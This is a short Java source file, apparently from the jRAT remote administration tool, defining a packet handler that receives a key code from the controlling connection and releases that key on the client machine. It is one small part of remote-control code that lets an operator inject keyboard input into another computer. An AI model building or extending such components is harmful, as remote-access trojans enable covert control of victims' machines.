package jrat.client.packets.incoming;

import jrat.common.utils.Utils;
import jrat.client.Connection;
import jrat.client.utils.ScreenUtils;

public class Packet95KeyRelease extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int btn = con.readInt();
		
		if (!Utils.isHeadless()) {
			try {
				ScreenUtils.getDefault().keyRelease(btn);
			} catch (IllegalArgumentException e) {

			}
		}
	}

}
